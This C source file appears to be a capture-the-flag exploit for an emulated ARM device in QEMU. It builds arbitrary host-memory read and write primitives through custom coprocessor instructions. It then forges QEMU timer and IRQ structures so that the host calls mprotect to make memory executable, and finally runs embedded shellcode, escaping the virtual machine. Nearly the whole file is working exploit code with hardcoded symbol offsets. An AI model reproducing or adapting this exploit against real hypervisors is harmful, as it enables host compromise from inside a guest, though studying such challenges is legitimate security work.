#include <assert.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>


// system_memory is a symbol that will definitely have 2 large values
// at beginning, and precedes cpu_env
#define SYM_system_memory 0x1576150
#define SYM_cpus 0x13eb160
#define SYM_system 0xbb2b30
#define SYM_qemu_clocks 0x39ac700
#define SYM_qemu_timer_notify_cb 0x43d868
#define SYM_main_loop_tlg 0x39ac6e0
#define SYM_qemu_set_irq 0x69b7f4
#define SYM_qemu_mprotect_rwx 0x98fc4b

extern char _binary_shellcode_bin_start[];
extern char _binary_shellcode_bin_end[];

typedef struct QemuEvent {
  uint32_t value;
  uint32_t initialized;
} QemuEvent;

typedef struct QEMUTimerList {
  uint64_t clock;
  char active_timers_lock[0x30];
  uint64_t active_timers;
  struct {
    uint64_t le_next;
    uint64_t le_prev;
  };
  uint64_t notify_cb;
  uint64_t notify_opaque;
  /* lightweight method to mark the end of timerlist's running */
  QemuEvent timers_done_ev;
} QEMUTimerList;

typedef struct QEMUTimer {
    int64_t expire_time;        /* in nanoseconds */
    uint64_t timer_list;
    uint64_t cb;
    uint64_t opaque;
    uint64_t next;
    int scale;
} QEMUTimer;

struct IRQState {
    char parent_obj[0x28];
    uint64_t handler;
    uint64_t opaque;
    uint32_t n;
};

#define PROT_READ 0x1
#define PROT_WRITE 0x2
#define PROT_EXEC 0x4

/*
  Limitation: copies max(size, *(uint64_t*)(host_addr-8)) bytes (which
  is zero if the 8 bytes before host_addr are zero). Stated another
  way: the primitive acts on length-prefixed buffers.
 */
uint32_t arbitrary_read(uint64_t host_addr, char *buf, uint32_t size) {
  char pass[0x40] = {0};
  // buffer used to overwrite target_idx counter in get
  uint64_t tag_buf[2] = {~0ULL, ~0ULL};
  // location for returned tag from add command
  uint64_t out_tag = 0;
  uint32_t result_sz = size;

  *((uint64_t*)&pass[0x30]) = host_addr - 0x18;

  // "add" command, sets pointer on stack to host_addr
  asm (
       "cpy r2, %[out_tag]\n"
       "mov r1, %[passlen]\n"
       "cpy r4, %[pass]\n"
       "mcr2 4, #0, R1, CR2, CR0, #0"
       : "=m"(out_tag)
       : [pass] "r" (&pass[0]), [passlen] "I" (sizeof(pass)), [out_tag] "r" (&out_tag)
       : "r1", "r2", "r4", "memory"
       );

  // "get" command, tag in R4, read buf in r1, buf len in r2
  asm (
       "cpy r4, %[tag_buf]\n"
       "cpy r2, %[result_sz]\n"
       "mov r1, %[result]\n"
       //      opc1  Rt  CRn  CRm  opc2
       "mcr2 4, #0,  R1, CR2, CR15, #2"
       : "+m"(result_sz), "=m"(*buf)
       : [tag_buf] "r" (&tag_buf),
         [result] "r" (buf), [result_sz] "r" (&result_sz)
       : "r1", "r2", "r4", "memory"
       );

  // Immediately delete the entry we added
  asm (
       "cpy r4, %[tag]\n"
       //      opc1  Rt  CRn  CRm  opc2
       "mcr2 4, #0,  R0, CR0, CR8, #1"
       :
       : [tag] "r" (&out_tag)
       : "r4"
       );


  return result_sz;
}

void arbitrary_write(uint64_t host_addr, char *buf, uint32_t len) {
  char pass[0x40] = {0};
  // buffer used to overwrite target_idx counter in edit
  uint64_t tag_buf[2] = {~0ULL, ~0ULL};
  // location for returned tag from add command
  uint64_t out_tag;

  *((uint64_t*)&pass[0x30]) = host_addr - 0x18;

  // add command, sets pentry to host_addr
  asm (
       "cpy r2, %[out_tag]\n"
       "mov r1, %[passlen]\n"
       "cpy r4, %[pass]\n"
       "mcr2 4, #0, R1, CR2, CR0, #0"
       : "=m"(out_tag)
       : [pass] "r" (&pass[0]), [passlen] "I" (sizeof(pass)), [out_tag] "r" (&out_tag)
       : "r1", "r2", "r4", "memory"
       );

  // Immediately execute edit command, so host_addr is still on stack.
  // I think these end up as part of the same translation block
  // because there's no branch between them
  asm (
       "cpy r4, %[tag_buf]\n"
       "cpy r2, %[len]\n"
       "cpy r1, %[buf]\n"
       //      opc1  Rt  CRn  CRm  opc2
       "mcr2 4, #0,  R1, CR2, CR15, #3"
       :
       : [buf] "r" (buf), [len] "r" (len), [tag_buf] "r" (&tag_buf)
       : "r1", "r2", "r4"
       );

  // Immediately delete the entry we added
  asm (
       "cpy r4, %[tag]\n"
       //      opc1  Rt  CRn  CRm  opc2
       "mcr2 4, #0,  R0, CR0, CR8, #1"
       :
       : [tag] "r" (&out_tag)
       : "r4"
       );
}

/*
  Next step: use technique from
  https://vishnudevtj.github.io/notes/qemu-vm-escape-cve-2019-14378#orgf2b8ad3
  to achieve code execution: create fake timer list with an expired
  timer, which causes QEMU to invoke callback
*/
void pwn1(uint64_t tpm_entry_base) {
  QEMUTimerList fake_list = {0};
  QEMUTimer fake_timer = {0};
  struct IRQState irqstate = {0};
  const uint64_t fake_list_addr = tpm_entry_base;
  const uint64_t fake_timer_addr = tpm_entry_base + 0x58*2+ 0x18;
  const uint64_t irqstate_addr = tpm_entry_base + 0x58*3 + 0x18;

  fake_list.clock = SYM_qemu_clocks;
  fake_list.active_timers_lock[0x28] = 1;
  fake_list.active_timers = fake_timer_addr;
  fake_list.le_next = 0;
  fake_list.le_prev = 0;
  fake_list.notify_cb = SYM_qemu_timer_notify_cb;
  fake_list.notify_opaque = 0;
  fake_list.timers_done_ev.value = 0;
  fake_list.timers_done_ev.initialized = 1;

  fake_timer.timer_list = fake_list_addr;
  fake_timer.cb = SYM_qemu_set_irq;
  fake_timer.opaque = irqstate_addr;
  fake_timer.scale = 1000000;
  fake_timer.expire_time = -1;

  irqstate.handler = SYM_qemu_mprotect_rwx;
  irqstate.opaque = (tpm_entry_base & (~0xfffULL));
  printf("Doing mprotect on 0x%llx\n", (tpm_entry_base & (~0xfffULL)));
  irqstate.n = 0x1000;

  // Writes are broken up into chunks due to size limitation of
  // arbitrary write
  arbitrary_write(fake_list_addr, (char*)&fake_list, sizeof(fake_list)-0x30);
  arbitrary_write(fake_list_addr+0x30, ((char*)&fake_list) + 0x30, 0x20);
  arbitrary_write(fake_list_addr+0x50, ((char*)&fake_list) + 0x50, sizeof(fake_list) - 0x50);
  arbitrary_write(fake_timer_addr, (char*)&fake_timer, sizeof(fake_timer));
  arbitrary_write(irqstate_addr, (char*)&irqstate, sizeof(irqstate));

  arbitrary_write(SYM_main_loop_tlg, (char*)&fake_list_addr, sizeof(fake_list_addr));

}

void pwn2(uint64_t tpm_entry_base) {
  QEMUTimerList fake_list = {0};
  QEMUTimer fake_timer = {0};
  const uint64_t fake_list_addr = tpm_entry_base;
  const uint64_t fake_timer_addr = tpm_entry_base + 0x58*2+ 0x18;
  const uint64_t shellcode_addr = tpm_entry_base + 0x58*3 + 0x14;
  const size_t shellcode_sz = _binary_shellcode_bin_end - _binary_shellcode_bin_start;

  fake_list.clock = SYM_qemu_clocks;
  fake_list.active_timers_lock[0x28] = 1;
  fake_list.active_timers = fake_timer_addr;
  fake_list.le_next = 0;
  fake_list.le_prev = 0;
  fake_list.notify_cb = SYM_qemu_timer_notify_cb;
  fake_list.notify_opaque = 0;
  fake_list.timers_done_ev.value = 0;
  fake_list.timers_done_ev.initialized = 1;

  fake_timer.timer_list = fake_list_addr;
  fake_timer.cb = shellcode_addr;
  fake_timer.opaque = 0;
  fake_timer.scale = 1000000;
  fake_timer.expire_time = -1;

  arbitrary_write(fake_list_addr, (char*)&fake_list, sizeof(fake_list)-0x30);
  arbitrary_write(fake_list_addr+0x30, ((char*)&fake_list) + 0x30, 0x20);
  arbitrary_write(fake_list_addr+0x50, ((char*)&fake_list) + 0x50, sizeof(fake_list) - 0x50);
  arbitrary_write(fake_timer_addr, (char*)&fake_timer, sizeof(fake_timer));
  arbitrary_write(shellcode_addr, (char*)_binary_shellcode_bin_start, 0x30);
  arbitrary_write(shellcode_addr + 0x30, (char*)_binary_shellcode_bin_start+0x30, shellcode_sz - 0x30);

}

int main(int argc, char *argv[]) {
  // First, we read from the cpu_env symbol to get the offset within
  // struct CPUState of the env_ptr member. I start the read from the
  // system_memory symbol (which precedes cpu_env) because our read
  // primitive requires that the 8 bytes prior to our read start,
  // interpreted as a uint64, are >= the size we try to read (like a
  // length-prefixed string)
  char *buf = calloc(0x300, sizeof(char));
  uint32_t result = arbitrary_read(SYM_system_memory + 8, buf, 0x250);

  assert(result == 0x250);
  uint64_t env_ptr_offset = *(uint64_t*)&buf[0x248];

  printf("env_ptr_offset: 0x%lX\n", env_ptr_offset);

  // Read the CPUState * for the first (and only) CPU. (nproc on the
  // challenge server is 1)
  result = arbitrary_read(SYM_cpus + 8, buf, 8);
  assert(result == 8);
  uint64_t first_cpu = (*(uint64_t*)buf) - 0x8200;

  result = arbitrary_read(first_cpu + env_ptr_offset, buf, 8);
  assert(result == 8);

  uint64_t cpuenv = *(uint64_t*)buf;
  printf("cpuenv at 0x%llx\n", cpuenv);

  uint64_t tpm_base = cpuenv + 0x16810;

  pwn1(tpm_base);

  // let event loop run
  sleep(2);

  pwn2(tpm_base);

  return 0;
}
